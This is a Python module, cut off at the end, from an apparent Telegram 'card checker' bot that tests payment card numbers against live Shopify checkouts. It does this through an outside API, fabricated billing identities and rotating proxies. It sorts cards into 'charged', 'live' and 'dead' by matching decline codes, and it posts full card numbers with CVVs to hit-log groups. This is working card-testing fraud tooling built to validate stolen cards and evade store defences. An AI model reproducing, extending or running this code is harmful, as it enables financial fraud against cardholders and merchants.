"""
sh.py  v16  —  /sh  single-card Shopify checker
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Framework : python-telegram-bot  v21+  (PTB, NOT aiogram)
API       : https://goshopi.up.railway.app/shopii
Proxies   : px.txt  (shuffled, rotated — DIFFERENT proxy each call)
Sites     : sites.txt  (shuffled, different site each retry)
Retries   : SITE_RETRIES different sites per card before giving up

EXPORTS USED BY main.py
  • get_sh_handler()         → single CommandHandler("sh", cmd_sh)
  • _check_card_with_retry() → retry loop (called by main.py's cmd_msh)
  • SITE_RETRIES             → int constant
  • SITE_TIMEOUT             → int constant
  • MSH_SESSIONS             → session dict (used by main.py's callbacks)
  • cb_msh_result            → callback for download buttons
  • cb_msh_stop              → callback for stop button

Charged response format:
  [❆] Charged 💎
  💳
     ⤷ 4031630487748989|12|29|522
  Gate ➳ Shopify | 1.0 USD
  ──────────
  Resp ➳ ORDER_PAID
  Bin  ➳ VISA - Sutton Bank - 🇺🇸 United States of America
  ──────────
  ⏱ ➳ 3m 59s
  👤 ➳ Tom ⭐
  ⚡ ➳ Batmancardchk ⭐
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
"""

from __future__ import annotations

import asyncio
import logging
import os
import random
import re
import string
import time
from datetime import datetime
from html import escape
from io import BytesIO
from typing import Optional

import aiohttp
from telegram import Update, InputFile
from telegram.ext import CommandHandler, CallbackQueryHandler, ContextTypes

from config import (
    OWNER_ID,
    FORCE_CHANNELS,
    get_bin_info,
    tg_emoji,
    get_plan_emoji_id,
    get_random_live_emoji,
    RawMarkup,
    _btn,
    CARD_EMOJI_ID,
    USER_EMOJI_ID,
    TIME_EMOJI_ID,
    DEV_EMOJI_ID,
    PRO_EMOJI_ID,
    PROG_GATE_EMOJI_ID,
    PROG_PROGRESS_EMOJI_ID,
    PROG_CHARGED_EMOJI_ID,
    PROG_LIVE_EMOJI_ID,
    PROG_DEAD_EMOJI_ID,
    PROG_ERRORS_EMOJI_ID,
    LIVE_EMOJI_IDS,
    PLAN_EMOJIS,
    SPECIAL_FONT_MAP,
    BOT_NAME,
    CHANNEL_LINK,
)

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# CONSTANTS
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
GOSHOPI_URL   = "https://goshopi.up.railway.app/shopii"
FALLBACK_SITE = "aloracosmetics.myshopify.com"

BOT_CHANNEL   = CHANNEL_LINK
DEV_LINK_HTML = f'<a href="{BOT_CHANNEL}">{BOT_NAME}</a>'

HIT_LOG_GROUP_ID       = -1004361062205
EXTRA_CHARGED_GROUP_ID = -1003991915326

SH_COOLDOWN  = 25   # seconds between free /sh calls

# ── Speed settings (also imported by main.py's cmd_msh) ───
SITE_RETRIES   = 6    # try up to N different sites per card
SITE_TIMEOUT   = 90   # per-request timeout (seconds)

# ── Internal mass-check constants ──────────────────────
MAX_CONCURRENT   = 80   # parallel card checks
PROGRESS_EVERY_N = 3    # update progress every N cards
BUTTON_LOCK_SECS = 10   # lock download buttons for N seconds after start

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# CUSTOM EMOJI IDs  (local — do not need to import from config)
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
DECLINED_EMOJI_ID    = "4956612582816351459"
HIT_RESP_EMOJI_ID    = "5839116473951328489"
BTN_LIVE_EMOJI_ID    = "5039793437776282663"
BTN_CHARGED_EMOJI_ID = "5465465194056525619"
BTN_ALL_EMOJI_ID     = "4956324463525233747"
BTN_STOP_EMOJI_ID    = "6179444193518162239"

CHARGED_EMOJI_IDS = [
    "5801154993188770160", "4956739572114392015", "5285221724634239278",
    "5287777298894835685", "5285024405246725814", "5287547831677112267",
    "5287658362660474522", "5285186510197381130", "5803233241963959320",
    "5462902520215002477", "5787435351521889877", "5323674506705785412",
    "5801005158959683238", "5436143465211640305", "5800688138833629633",
    "5891044423856296980", "5436068999068662274", "5427168083074628963",
]

# Callback prefixes for mass-check buttons
_CB_RESULT = "mshr"
_CB_STOP   = "mshs"

# In-memory session store — shared with main.py's callback_handler
MSH_SESSIONS: dict = {}

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# FAKE BILLING DATA
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
_FAKE_FIRST = [
    "James","John","Robert","Michael","William","David","Richard","Joseph",
    "Thomas","Charles","Emma","Olivia","Ava","Isabella","Sophia","Mia",
    "Charlotte","Amelia","Harper","Evelyn",
]
_FAKE_LAST = [
    "Smith","Johnson","Williams","Brown","Jones","Garcia","Miller","Davis",
    "Rodriguez","Martinez","Wilson","Anderson","Taylor","Thomas","Lee",
]
_FAKE_STREETS = [
    "123 Main St","456 Oak Ave","789 Pine Rd","321 Maple Dr","654 Elm St",
    "987 Cedar Ln","147 Birch Blvd","258 Walnut Way","369 Spruce Ct",
    "741 Willow Park","852 Ash Terrace","963 Poplar Circle",
]
_FAKE_CITIES = [
    ("New York","NY","10001"), ("Los Angeles","CA","90001"),
    ("Chicago","IL","60601"),  ("Houston","TX","77001"),
    ("Phoenix","AZ","85001"),  ("Philadelphia","PA","19101"),
    ("San Antonio","TX","78201"), ("San Diego","CA","92101"),
    ("Dallas","TX","75201"),   ("San Jose","CA","95101"),
]

def _fake_billing() -> dict:
    first  = random.choice(_FAKE_FIRST)
    last   = random.choice(_FAKE_LAST)
    street = random.choice(_FAKE_STREETS)
    city, state, zip_ = random.choice(_FAKE_CITIES)
    phone  = f"+1{''.join(random.choices('0123456789', k=10))}"
    email  = f"{first.lower()}.{last.lower()}{random.randint(10,99)}@gmail.com"
    return {
        "first_name": first, "last_name": last,
        "address1":   street, "city":     city,
        "province":   state,  "zip":      zip_,
        "country":    "US",   "phone":    phone,
        "email":      email,
    }

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# PROXY LOADER  — px.txt first, then proxies.txt
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
def _load_proxies() -> list:
    for fname in ("px.txt", "proxies.txt"):
        try:
            with open(fname, encoding="utf-8", errors="ignore") as f:
                lines = [
                    l.strip() for l in f
                    if l.strip() and not l.startswith(("#", ";", "//"))
                ]
            if lines:
                random.shuffle(lines)
                logging.info(f"[SH] {len(lines)} proxies from {fname}")
                return lines
        except FileNotFoundError:
            pass
    logging.warning("[SH] No proxy file found — running proxyless")
    return []

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# SITE LOADER  — sites.txt, shuffled
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
def _load_sites() -> list:
    try:
        with open("sites.txt", encoding="utf-8", errors="ignore") as f:
            lines = [l.strip() for l in f if l.strip() and not l.startswith("#")]
        if lines:
            random.shuffle(lines)
            return lines
    except FileNotFoundError:
        pass
    return [FALLBACK_SITE]

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# PROXY NORMALISER
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
def _norm_proxy(p: str) -> str:
    p = p.strip()
    if p.startswith(("http://", "https://", "socks5://", "socks4://")):
        return p
    return f"http://{p}"

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# CARD UTILITIES
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
def luhn_check(n: str) -> bool:
    n = str(n).strip()
    if not n.isdigit():
        return False
    total = 0
    for i, c in enumerate(n[::-1]):
        d = int(c)
        if i % 2 == 1:
            d *= 2
            if d > 9:
                d -= 9
        total += d
    return total % 10 == 0

def is_expired(mm: str, yy: str) -> bool:
    try:
        now = datetime.now()
        ey, em = int(yy), int(mm)
        if ey < now.year % 100:
            return True
        if ey == now.year % 100 and em < now.month:
            return True
        return False
    except ValueError:
        return True

def extract_cards(text: str) -> list:
    patterns = [
        r"(\d{13,19})\s*\|\s*(\d{1,2})\s*\|\s*(\d{2,4})\s*\|\s*(\d{3,4})",
        r"(\d{13,19})\s*\/\s*(\d{1,2})\s*\/\s*(\d{2,4})\s*\/\s*(\d{3,4})",
        r"(\d{13,19})\s*:\s*(\d{1,2})\s*:\s*(\d{2,4})\s*:\s*(\d{3,4})",
        r"(\d{13,19})\s+(\d{1,2})\s+(\d{2,4})\s+(\d{3,4})",
        r"(\d{13,19})\s*=\s*(\d{1,2})\s*=\s*(\d{2,4})\s*=\s*(\d{3,4})",
    ]
    seen, results = set(), []
    for pat in patterns:
        for m in re.findall(pat, text):
            if len(m) != 4:
                continue
            cc, mm, yy, cvv = m
            mm = mm.zfill(2)
            if len(yy) == 4:
                yy = yy[2:]
            s = f"{cc}|{mm}|{yy}|{cvv}"
            if s not in seen:
                seen.add(s)
                results.append(s)
    return results

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# RESPONSE CLASSIFIER
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

# Site/network errors — try a different site, do NOT count as DEAD
_RETRY_PATTERNS = [
    "r4 token empty", "r2 id empty", "payment method is not shopify",
    "product not found", "hcaptcha detected", "tax ammount empty",
    "del ammount empty", "product id is empty", "py id empty",
    "clinte token", "hcaptcha_detected", "receipt_empty",
    "site error! status: 429", "site requires login", "failed to get token",
    "no valid products", "not shopify", "site not supported", "validation_custom",
    "connection error", "connection_error",
    "returned status 500", "returned status 502", "returned status 503",
    "returned status 504", "returned status 429",
    "token not found", "invalid_response",
    "could not resolve host", "connect tunnel failed", "curl error",
    "no proxies available", "proxy error",
    "payments_credit_card_brand_not_supported",
    "buyer_identity_currency",
    "step 0 failed", "step 1 failed", "step 2 failed", "step 3 failed",
    "step 4 failed", "step 5 failed", "step 6 failed", "step 7 failed",
    "step 8 failed", "step 9 failed", "step 10 failed",
    "session_error", "delivery_no_delivery_strategy",
    "delivery_zone_not_found", "delivery_delivery_line_detail_changed",
    "no available delivery strategy",
    "delivery_strategy_conditions_not_satisfied",
    "no available products found",
    "could not extract receiptid", "receiptid missing",
    "response missing receiptid", "inventory_failure", "products.json",
    "store incompatible", "extract signedhandles",
    "missing receiptid", "no_products", "no_product", "vault_failed",
    "merchandise_out_of_stock", "connection timed out", "connection failed",
    "api timeout", "connection reset", "network error",
    "invalid json", "json decode",
    "buyer_identity_marketing_consent",
    "missing stableid", "missing buildid", "missing sourcetoken",
    "checkout_failed", "delivery_out_of_stock_at_origin_location",
    "could not extract private_access_token",
    "buyer_identity_currency_not_supported_by_shop",
    "could not find actions js url", "missing proposal", "missing submit id",
    "exceeded 30 poll attempts", "could not extract queuetoken",
    "could not extract identification signature",
    "could not extract session id", "could not extract delivery handle",
    "could not extract shipping amount", "could not extract total amount",
    "could not extract sessiontoken", "errstoreincompatible",
    "errmissingreceiptid", "site overloaded", "site rate limited",
    "max retries",
    "site error! status: 404", "site error! status: 500",
    "site error! status: 402", "site error! status: 502",
    "site error! 503",   "site error! status: 503",
    "site error! status: 403", "payment method is not shopify!",
    "site error! status: 401", "could not extract signedhandles",
    "site not found", "failed to add to cart",
    "failed to get checkout", "failed to get session token",
    "unable to get payment token", "failed to get session",
    "error processing card",
]

# Hard bank declines — card is confirmed DEAD
_DEAD_PATTERNS = [
    "CARD_DECLINED", "PROCESSING_ERROR", "GENERIC_DECLINE",
    "DO_NOT_HONOR", "DO NOT HONOR", "UNKNOWN_ERROR", "Processing Error",
    "PICK_UP_CARD", "DECISION_RULE_BLOCK", "FRAUD_SUSPECTED",
    "INVALID_PURCHASE_TYPE", "INVALID_PAYMENT_METHOD", "TEST_MODE_LIVE_CARD",
    "AMOUNT_TOO_SMALL", "INCORRECT_NUMBER", "EXPIRED_CARD",
    "CALL_ISSUER", "STOLEN_CARD", "LOST_CARD", "RESTRICTED_CARD",
    "TRANSACTION_NOT_ALLOWED", "TRANSACTION NOT ALLOWED",
    "card_declined", "lost_card", "stolen_card", "expired_card",
    "incorrect_cvc", "processing_error", "fraudulent", "restricted_card",
    "security_violation", "service_not_allowed",
    "try_again_later", "withdrawal_count_limit_exceeded",
]


def classify_response(msg: str) -> str:
    """
    Classify raw API response string.
    Returns: CHARGED | TDS | LIVE | DEAD | RETRY
    """
    if not msg:
        return "RETRY"
    mu = msg.upper()
    ml = msg.lower()

    # CHARGED — money taken
    if any(x in mu for x in (
        "ORDER_PAID", "CHARGED", "CAPTURED",
        "PAYMENT_AUTHORIZED", "SUBSCRIPTION_CREATED",
        "PAYMENT_CAPTURED", "TRANSACTION_APPROVED",
    )):
        return "CHARGED"

    # 3DS — card is live but needs auth
    if any(x in mu for x in ("3DS_REQUIRED", "3D_SECURE", "3D SECURE")):
        return "TDS"

    # LIVE — soft bank decline (card real but insufficient/wrong CVV/zip)
    if any(x in mu for x in (
        "INSUFFICIENT_FUNDS", "INSUFFICIENT FUNDS",
        "INCORRECT_CVV", "INCORRECT_CVC",
        "INCORRECT_ZIP", "SECURITY_CODE",
        "CVV_FAILED", "CVC_FAILED",
    )):
        return "LIVE"
    if mu.strip() == "APPROVED" or ("APPROVED" in mu and "NOT" not in mu):
        return "LIVE"

    # DEAD — hard bank decline
    if "GENERIC_ERROR" in mu:
        return "DEAD"
    if any(d.upper() in mu for d in _DEAD_PATTERNS):
        return "DEAD"

    # RETRY — site/network error, try another site
    if any(r in ml for r in _RETRY_PATTERNS):
        return "RETRY"
    if mu.strip() in ("TIMEOUT", "UNKNOWN", "ERROR", ""):
        return "RETRY"

    # Unknown — treat as DEAD (card was checked, result unclear)
    return "DEAD"

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# API CALL
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
async def _call_api(
    session: aiohttp.ClientSession,
    card: str,
    site: str,
    proxy: Optional[str],
    timeout: float = SITE_TIMEOUT,
) -> dict:
    """POST to goshopi API. Always passes full https:// site URL."""
    if not site.startswith("http"):
        site = f"https://{site}"

    billing = _fake_billing()
    params: dict = {
        "cc":    card,
        "site":  site,
        "fname":   billing["first_name"],
        "lname":   billing["last_name"],
        "address": billing["address1"],
        "city":    billing["city"],
        "state":   billing["province"],
        "zip":     billing["zip"],
        "country": billing["country"],
        "phone":   billing["phone"],
        "email":   billing["email"],
    }
    if proxy:
        params["proxy"] = proxy

    try:
        async with session.get(
            GOSHOPI_URL,
            params=params,
            timeout=aiohttp.ClientTimeout(total=timeout),
            ssl=False,
        ) as resp:
            try:
                return await resp.json(content_type=None)
            except Exception:
                raw = await resp.text()
                return {"Response": raw[:300]}
    except asyncio.TimeoutError:
        return {"Response": "timeout"}
    except asyncio.CancelledError:
        raise
    except Exception as e:
        return {"Response": f"connection_error: {str(e)[:80]}"}


def _get_resp_text(data: dict) -> str:
    return str(
        data.get("Response", data.get("response", data.get("message", "Unknown")))
    ).strip()

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# CORE RETRY LOOP  — SITE_RETRIES different sites per card
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
async def _check_card_with_retry(
    session: aiohttp.ClientSession,
    card: str,
    sites: list,
    proxies: list,
    max_sites: int = SITE_RETRIES,
    site_timeout: float = SITE_TIMEOUT,
    sid: str = "",
) -> tuple:
    """
    Try card on up to max_sites DIFFERENT random sites.
    Returns (verdict, display_resp, price, currency).
    verdict: CHARGED | TDS | LIVE | DEAD | ERROR
    """
    if not sites:
        sites = [FALLBACK_SITE]

    pool = sites[:]
    random.shuffle(pool)

    px_pool = proxies[:] if proxies else []
    if px_pool:
        random.shuffle(px_pool)

    tried: set = set()
    price, currency = "0.00", "USD"
    last_resp = "All sites exhausted"
    all_retry = True

    for attempt in range(max_sites):
        # Check stop flag for mass sessions
        if sid and MSH_SESSIONS.get(sid, {}).get("status") == "STOPPED":
            raise asyncio.CancelledError()

        # Pick an untried site
        untried = [s for s in pool if s not in tried]
        if not untried:
            tried.clear()
            untried = pool[:]
        site = random.choice(untried)
        tried.add(site)

        # Different proxy for every attempt
        proxy = None
        if px_pool:
            proxy = _norm_proxy(px_pool[attempt % len(px_pool)])

        try:
            data = await _call_api(session, card, site, proxy, timeout=site_timeout)
        except asyncio.CancelledError:
            raise
        except Exception:
            continue

        raw     = _get_resp_text(data)
        verdict = classify_response(raw)
        price    = str(data.get("Price",    data.get("price",    "0.00"))).strip()
        currency = str(data.get("Currency", data.get("currency", "USD"))).strip()
        last_resp = raw

        if verdict in ("CHARGED", "TDS", "LIVE", "DEAD"):
            all_retry = False
            return verdict, raw, price, currency
        # RETRY → loop continues with a different site

    if all_retry:
        return "ERROR", last_resp, price, currency
    return "DEAD", last_resp, price, currency

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# PERSISTENT HTTP SESSION FOR /sh
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
_SH_SESSION: Optional[aiohttp.ClientSession] = None
_BIN_CACHE: dict = {}

async def _sh_session() -> aiohttp.ClientSession:
    global _SH_SESSION
    if _SH_SESSION is None or _SH_SESSION.closed:
        conn = aiohttp.TCPConnector(
            limit=200, limit_per_host=60,
            keepalive_timeout=60, ssl=False,
        )
        _SH_SESSION = aiohttp.ClientSession(
            connector=conn,
            headers={"User-Agent": "Mozilla/5.0 (BatChk/16)"},
            timeout=aiohttp.ClientTimeout(total=SITE_TIMEOUT + 5),
        )
    return _SH_SESSION

async def _bin_lookup(bin6: str) -> dict:
    if bin6 in _BIN_CACHE:
        return _BIN_CACHE[bin6]
    try:
        result = await asyncio.wait_for(get_bin_info(bin6), timeout=8)
        result = result or {}
    except Exception:
        result = {}
    _BIN_CACHE[bin6] = result
    return result

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# MISC HELPERS
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
def _te(eid: str, fb: str = "●") -> str:
    """Render a Telegram custom emoji HTML tag."""
    return f'<tg-emoji emoji-id="{eid}">{fb}</tg-emoji>'

def _rand_charged() -> str:
    return _te(random.choice(CHARGED_EMOJI_IDS), "💎")

def _rand_live() -> str:
    return _te(get_random_live_emoji(), "✅")

def _plan_eid(plan: str) -> str:
    norm = "".join(SPECIAL_FONT_MAP.get(c, c.upper()) for c in (plan or ""))
    if norm in PLAN_EMOJIS:
        return PLAN_EMOJIS[norm]
    for k, v in PLAN_EMOJIS.items():
        if k in norm:
            return v
    return PRO_EMOJI_ID

def _user_link(user) -> str:
    name = escape(user.first_name or "User")
    if user.username:
        return f'<a href="https://t.me/{user.username}">{name}</a>'
    return f'<a href="tg://user?id={user.id}">{name}</a>'

def _fmt_time(s: float) -> str:
    s = int(s)
    return f"{s // 60}m {s % 60}s" if s >= 60 else f"{s}s"

def _fmt_price(price: str, currency: str) -> str:
    if price and price not in ("0.00", "0", "", "-1.0", "-1"):
        return f"{escape(price)} {escape(currency)}"
    return "0-20$"

def _is_premium(ud: dict, user_id: int) -> bool:
    return (user_id == OWNER_ID
            or ud.get("premium", False)
            or ud.get("plan") not in (None, "TRIAL"))

def _get_ud(user_id: int, context) -> dict:
    return context.bot_data.setdefault("users", {}).setdefault(user_id, {})

def _sid() -> str:
    return "".join(random.choices(string.ascii_uppercase + string.digits, k=8))

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# BIN STRING FORMATTER
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
def _bin_str(bin_data: dict) -> str:
    scheme  = escape(str(bin_data.get("scheme",  "N/A")).upper())
    bank    = escape(str(bin_data.get("bank",    "N/A")))
    country = escape(str(bin_data.get("country", "N/A")))
    flag    = bin_data.get("country_emoji", "")
    cstr    = f"{flag} {country}".strip() if flag else country
    return f"{scheme} - {bank} - {cstr}"

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# RESULT MESSAGE BUILDER
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
def build_result_msg(
    card: str,
    resp: str,
    verdict: str,
    bin_data: dict,
    price: str,
    currency: str,
    elapsed: float,
    user,
    plan: str,
) -> str:
    """
    Build the formatted result message.
    Public so main.py's cmd_msh can call it for charged/live hits.
    """
    ulink     = _user_link(user)
    peid      = _plan_eid(plan)
    ts        = _fmt_time(elapsed)
    price_str = _fmt_price(price, currency)
    bin_s     = _bin_str(bin_data)
    ch_link   = f'<a href="{BOT_CHANNEL}">[❆]</a>'
    safe_resp = escape(resp)

    if verdict == "CHARGED":
        eid        = random.choice(CHARGED_EMOJI_IDS)
        status_ln  = f'<b>{ch_link} Charged {_te(eid, "💎")}</b>'
        gate_ln    = f'<b>Gate ➳ Shopify | {price_str}</b>'
    elif verdict == "TDS":
        status_ln  = f'<b>{ch_link} Live {_rand_live()} [3DS]</b>'
        gate_ln    = f'<b>Gate ➳ Shopify | 0-20$</b>'
    elif verdict == "LIVE":
        status_ln  = f'<b>{ch_link} Live {_rand_live()}</b>'
        gate_ln    = f'<b>Gate ➳ Shopify | 0-20$</b>'
    elif verdict == "DEAD":
        status_ln  = f'<b>{ch_link} Dead {_te(DECLINED_EMOJI_ID, "❌")}</b>'
        gate_ln    = f'<b>Gate ➳ Shopify | 0-20$</b>'
    else:
        status_ln  = f'<b>{ch_link} Error {_te(DECLINED_EMOJI_ID, "⚠️")}</b>'
        gate_ln    = f'<b>Gate ➳ Shopify | 0-20$</b>'

    return (
        f"{status_ln}\n\n"
        f"<b>{_te(CARD_EMOJI_ID, '💳')}</b>\n"
        f"<b>   ⤷ <code>{escape(card)}</code></b>\n"
        f"{gate_ln}\n"
        f"<b>──────────</b>\n"
        f"<b>Resp ➳ {safe_resp}</b>\n"
        f"<b>Bin  ➳ {bin_s}</b>\n"
        f"<b>──────────</b>\n"
        f"<b>{_te(TIME_EMOJI_ID,'⏱')} ➳ {ts}</b>\n"
        f"<b>{_te(USER_EMOJI_ID,'👤')} ➳ {ulink} {_te(peid,'⭐')}</b>\n"
        f"<b>{_te(DEV_EMOJI_ID,'⚡')} ➳ {DEV_LINK_HTML} {_te(PRO_EMOJI_ID,'⭐')}</b>"
    )

# Keep old name as alias so any existing calls still work
_build_result_msg = build_result_msg

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# MSH — BUTTONS
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
def _msh_buttons(sid: str, running: bool) -> RawMarkup:
    sess    = MSH_SESSIONS.get(sid, {})
    charged = sess.get("charged", 0)
    live    = sess.get("live",    0)
    checked = sess.get("checked", 0)

    rows = [
        [
            _btn(f"Charged ({charged})",
                 cb=f"{_CB_RESULT}:{sid}:charged",
                 style="primary", icon=BTN_CHARGED_EMOJI_ID),
            _btn(f"Live ({live})",
                 cb=f"{_CB_RESULT}:{sid}:live",
                 style="primary", icon=BTN_LIVE_EMOJI_ID),
        ],
        [
            _btn(f"All ({checked})",
                 cb=f"{_CB_RESULT}:{sid}:all",
                 style="primary", icon=BTN_ALL_EMOJI_ID),
        ],
    ]
    if running:
        rows.append([
            _btn("⛔ Stop",
                 cb=f"{_CB_STOP}:{sid}",
                 style="danger", icon=BTN_STOP_EMOJI_ID),
        ])
    return RawMarkup(rows)

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# MSH — PROGRESS TEXT
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
def _progress_text(sess: dict) -> str:
    elapsed = time.time() - sess["start_time"]
    ts      = _fmt_time(elapsed)
    ulink   = _user_link(sess["user_obj"]) if sess.get("user_obj") else "User"
    peid    = sess.get("plan_eid", PRO_EMOJI_ID)

    return (
        f'<b>{_te(PROG_GATE_EMOJI_ID,"🛒")} Gate ➳ Shopify</b>\n'
        f'<b>{_te(PROG_PROGRESS_EMOJI_ID,"🔄")} Progress ➳ {sess["checked"]}/{sess["total"]}</b>\n'
        f'<b>Charged ➳ {sess["charged"]} {_te(PROG_CHARGED_EMOJI_ID,"💎")}</b>\n'
        f'<b>Live    ➳ {sess["live"]} {_te(PROG_LIVE_EMOJI_ID,"✅")}</b>\n'
        f'<b>Dead    ➳ {sess["dead"]} {_te(PROG_DEAD_EMOJI_ID,"❌")}</b>\n'
        f'<b>Errors  ➳ {sess["errors"]} {_te(PROG_ERRORS_EMOJI_ID,"⚠️")}</b>\n'
        f'<b>Time    ➳ {ts}</b>\n'
        f'<b>{_te(USER_EMOJI_ID,"👤")} ➳ {ulink} {_te(peid,"⭐")}</b>\n'
        f'<b>{_te(DEV_EMOJI_ID,"⚡")} ➳ {DEV_LINK_HTML} {_te(PRO_EMOJI_ID,"⭐")}</b>'
    )

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# MSH — RESULT FILE GENERATOR
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
def _make_result_file(sess: dict, kind: str) -> tuple:
    """Returns (BytesIO, filename, count)."""
    if kind == "charged":
        cards = sess.get("charged_cards", [])
    elif kind == "live":
        cards = sess.get("live_cards", [])
    elif kind == "dead":
        cards = sess.get("dead_cards", [])
    else:  # all
        cards = (
            sess.get("charged_cards", []) +
            sess.get("live_cards",    []) +
            sess.get("dead_cards",    []) +
            sess.get("error_cards",   [])
        )

    label     = kind.capitalize()
    user_name = (sess.get("user_obj") and (sess["user_obj"].first_name or "User")) or "User"
    plan_name = sess.get("plan", "TRIAL")

    lines = [
        f"Gate  ➳ Shopify | 0-20$",
        f"Type  ➳ {label}",
        f"Total ➳ {len(cards)}",
        f"User  ➳ {user_name} ({plan_name})",
        f"Dev   ➳ {BOT_NAME}",
        "━━━━━━━━━━━━━━",
    ]
    for cd in cards:
        binfo   = cd.get("bin_info", {})
        scheme  = binfo.get("scheme",  "N/A")
        bank    = binfo.get("bank",    "N/A")
        country = binfo.get("country", "N/A")
        flag    = binfo.get("country_emoji", "")
        cdisp   = f"{flag} {country}".strip() if flag else country
        lines += [
            f"Card   ➳ {cd.get('card','N/A')}",
            f"Status ➳ {cd.get('verdict','N/A')}",
            f"Gate   ➳ Shopify | {cd.get('price','0.00')} {cd.get('currency','USD')}",
            f"Resp   ➳ {cd.get('resp','N/A')}",
            f"Bin    ➳ {scheme} - {bank} - {cdisp}",
            "━━━━━━━━━━━━━━",
        ]

    buf = BytesIO("\n".join(lines).encode("utf-8"))
    buf.seek(0)
    ts    = datetime.now().strftime("%Y%m%d_%H%M%S")
    fname = f"BatChk_{label.upper()}_{ts}.txt"
    return buf, fname, len(cards)

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# MSH — HIT NOTIFICATION
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
async def _send_hit(bot, chat_id: int, user, reply_id: int, text: str, verdict: str):
    """Send hit to user chat and log groups."""
    try:
        await bot.send_message(
            chat_id=chat_id, text=text, parse_mode="HTML",
            disable_web_page_preview=True,
            reply_to_message_id=reply_id,
        )
    except Exception:
        try:
            await bot.send_message(chat_id=chat_id, text=text,
                                   parse_mode="HTML", disable_web_page_preview=True)
        except Exception:
            pass

    if HIT_LOG_GROUP_ID:
        try:
            eid     = (random.choice(CHARGED_EMOJI_IDS) if verdict == "CHARGED"
                       else get_random_live_emoji())
            label   = "Charged" if verdict == "CHARGED" else "Live"
            grp_txt = (
                f'<b><a href="{BOT_CHANNEL}">[❆]</a> {label} {_te(eid,"💎" if verdict=="CHARGED" else "✅")}</b>\n'
                f'<b>Gate ➳ Shopify Payments</b>\n'
                f'<b>{_te(HIT_RESP_EMOJI_ID,"✅")} {escape(verdict)}</b>\n'
                f'<b>{_user_link(user)}</b>'
            )
            await bot.send_message(chat_id=HIT_LOG_GROUP_ID, text=grp_txt,
                                   parse_mode="HTML", disable_web_page_preview=True)
        except Exception:
            pass

    if verdict == "CHARGED" and EXTRA_CHARGED_GROUP_ID:
        try:
            await asyncio.sleep(0.3)
            await bot.send_message(chat_id=EXTRA_CHARGED_GROUP_ID, text=text,
                                   parse_mode="HTML", disable_web_page_preview=True)
        except Exception:
            pass

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# MSH — PROGRESS EDIT
